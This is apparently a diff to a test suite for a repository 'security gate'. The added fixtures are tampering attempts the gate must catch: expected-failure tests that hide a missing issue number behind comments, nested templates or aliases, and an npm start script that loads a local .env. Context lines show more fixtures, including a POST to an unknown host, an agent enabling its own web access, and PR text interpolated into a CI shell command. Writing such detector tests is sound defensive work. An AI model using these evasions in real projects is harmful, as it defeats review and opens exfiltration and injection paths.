@@ -50,6 +50,21 @@ describe("security gate", () => {
     expect(r.output).toContain("all rules hold");
   });
 
+  it("accepts expected-failure names whose fixed text has the issue number, and examples in comments", () => {
+    const r = gate(copyWith((d) => append(d, "test/safety.test.ts", [
+      "",
+      "it." + 'fails("blocks links without // - known gap, #123", () => {});',
+      "it." + "fails('single quotes - known gap, #123', () => {});",
+      "it." + "fails(`gap ${a} #123 ${b}`, () => {});",
+      "it." + 'fails(`gap ${[1, 2].map((n) => `${n}`).join("}")} - known gap, #123`, () => {});',
+      "/" + "/ it." + 'fails("an example in a comment, no issue", () => {});',
+      "const n = 1; /" + "/ it." + 'fails("an example in a trailing comment", () => {});',
+      "/* it." + 'fails("an example in a block comment", () => {}); */',
+      "",
+    ].join("\n"))));
+    expect(r.output).toContain("all rules hold");
+  });
+
   const attacks: [string, string, (dir: string) => void][] = [
     ["an outbound call to an unknown host", "[egress]", (d) =>
       append(d, "src/filter.ts", '\nvoid fetch("https://metrics-collector.example.net/ingest", { method: "POST" });\n')],
@@ -73,6 +88,26 @@ describe("security gate", () => {
       patch(d, "src/main.ts", /const problems = checkRiderMessage\(msg, alert\);/, "const problems: string[] = [];")],
     ["a skipped test", "[tests]", (d) =>
       patch(d, "test/safety.test.ts", 'it("passes a normal message"', 'it' + '.skip("passes a normal message"')],
+    ["an expected-failure test that names no issue", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + "fails(`gap for ${\"x\"} with no issue`, () => {});\n")],
+    ["an expected-failure test whose name hides the missing issue behind //", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + 'fails("blocks // links with no issue", () => {});\n')],
+    ["an expected-failure test whose issue number is only inside ${...}", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + 'fails(`gap ${"#123".slice(0, 0)}`, () => {});\n')],
+    ["an expected-failure test whose name is not a string literal", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", '\nconst gapName = "gap #123";\nit.' + "fails(gapName, () => {});\n")],
+    ["an expected-failure test whose issue number is inside ${...} with a nested template", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + 'fails(`gap ${"#123".slice(0, 0) + `x`}`, () => {});\n')],
+    ["an expected-failure test whose issue number is behind a regex inside ${...}", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + 'fails(`gap ${"}".replace(/}/, "")} ${"#123".slice(0, 0)}`, () => {});\n')],
+    ["an expected-failure test whose issue number is only in a comment after the name", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit." + 'fails("gap /* a", () => {}); // */ #123 "\n')],
+    ["an expected-failure test with a comment between it. and fails", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nit./* x */" + 'fails("gap with no issue", () => {});\n')],
+    ["an expected-failure test split across a comment line", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nconst viaTest = test\n/" + "/ it\n  ." + 'fails("gap with no issue", () => {});\n')],
+    ["an expected-failure test registered through an alias", "[tests]", (d) =>
+      append(d, "test/safety.test.ts", "\nconst gap = it." + 'fails;\ngap("gap #123", () => {});\n')],
     ["an agent giving itself web access", "[agents]", (d) =>
       patch(d, "agents/maintainer/agent.md", "{name: web_fetch, enabled: false}", "{name: web_fetch, enabled: true}")],
     ["an agent dropping its no-push rule", "[agents]", (d) =>
@@ -85,6 +120,8 @@ describe("security gate", () => {
       patch(d, ".github/workflows/ci.yml", "  pull_request:\n", "  pull_request_target:\n")],
     ["PR text interpolated into a shell command", "[ci]", (d) =>
       append(d, ".github/workflows/ci.yml", "\n      - run: echo \"${{ github.event.pull_request" + ".title }}\"\n")],
+    ["npm start loading a local .env", "[supply-chain]", (d) =>
+      patch(d, "package.json", '"start": "tsx src/main.ts"', '"start": "tsx --env-file-if-exists=.env src/main.ts"')],
     ["a script on the public website", "[site]", (d) =>
       patch(d, "docs/index.html", "</body>", '<script src="https://cdn.example.com/a.js"></script>\n</body>')],
   ];
